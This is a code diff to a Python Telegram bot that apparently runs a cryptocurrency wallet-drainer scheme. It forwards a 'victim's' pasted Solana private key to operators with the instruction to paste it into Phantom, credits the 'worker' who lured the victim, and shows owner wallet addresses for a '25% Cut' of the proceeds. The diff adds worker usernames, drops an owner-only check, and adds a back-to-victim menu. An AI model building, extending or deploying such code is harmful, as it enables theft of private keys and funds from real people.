@@ -682,12 +682,19 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # If from worker, modify the message to indicate it's from a worker
         if custom_link_owner:
+            # Get worker username if available
+            try:
+                worker_info = await context.bot.get_chat(custom_link_owner)
+                worker_display = worker_info.username if worker_info.username else str(custom_link_owner)
+            except:
+                worker_display = str(custom_link_owner)
+            
             worker_message = (
                 "🌸 Victim imported Solana wallet (from worker)\n\n"
                 "🔎 Victim Information\n\n"
                 f"├ 👤 Name: {username}\n"
                 f"├ 🆔 {user_id}\n"
-                f"├ 👷 Worker ID: {custom_link_owner}\n"
+                f"├ 👷 Worker: @{worker_display}\n"
                 f"├ 🔑 Private Key:\n\n"
                 f"<b>⚠️ Paste the private key below into phantom.</b>\n\n"
                 f"<code>{message_text}</code>\n\n"
@@ -1479,24 +1486,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Handle Payment Addresses (for owners)
     if data == "show_payment_addresses":
-        if user_id in [OWNER_ID, SECOND_OWNER_ID]:
-            text = (
-                "💰 <b>Payment Addresses</b>\n\n"
-                "Please send payments to one of the following addresses:\n\n"
-                "🔹 <b>Solana Address</b> (Click to copy)\n"
-                "<code>7vY3pg1RwmLzNkZyQ47iEEqJ5j5WreY45ypPAkaaEdQe</code>\n\n"
-                "🔹 <b>Ethereum Address</b> (Click to Copy)\n"
-                "<code>0xaF688295e1F0C6c62140603B4EBACBB9ef00Cf61</code>\n\n"
-                "📞 <b>Support Account:</b> @Opimet"
-            )
-            await query.edit_message_text(
-                text=text,
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("❌ Close", callback_data="close")]
-                ]),
-                parse_mode=ParseMode.HTML,
-                disable_web_page_preview=True,
-            )
+        text = (
+            "💰 <b>Payment Addresses</b>\n\n"
+            "Please send payments to one of the following addresses:\n\n"
+            "🔹 <b>Solana Address</b> (Click to copy)\n"
+            "<code>7vY3pg1RwmLzNkZyQ47iEEqJ5j5WreY45ypPAkaaEdQe</code>\n\n"
+            "🔹 <b>Ethereum Address</b> (Click to Copy)\n"
+            "<code>0xaF688295e1F0C6c62140603B4EBACBB9ef00Cf61</code>\n\n"
+            "📞 <b>Support Account:</b> @Opimet"
+        )
+        await query.edit_message_text(
+            text=text,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("⬅️ Back", callback_data="back_to_victim_info"),
+                 InlineKeyboardButton("❌ Close", callback_data="close")]
+            ]),
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True,
+        )
         return
 
     # Handle Current Workers (only for owners)
@@ -1567,6 +1574,30 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("❌ Close", callback_data="close")]
+        ])
+        
+        await query.edit_message_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=keyboard,
+            disable_web_page_preview=True,
+        )
+        return
+
+    # Handle back to victim info
+    if data == "back_to_victim_info":
+        # This will show a generic message since we can't retrieve the original victim info
+        # In a real implementation, you'd store this data temporarily
+        text = (
+            "🌸 <b>Victim Information</b>\n\n"
+            "Use the buttons below to view payment addresses or close this message.\n\n"
+            "📞 For support, contact @Opimet"
+        )
+        
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📞 Support", url="https://t.me/Opimet")],
+            [InlineKeyboardButton("💰 Send 25% Cut", callback_data="show_payment_addresses")],
             [InlineKeyboardButton("❌ Close", callback_data="close")]
         ])
         
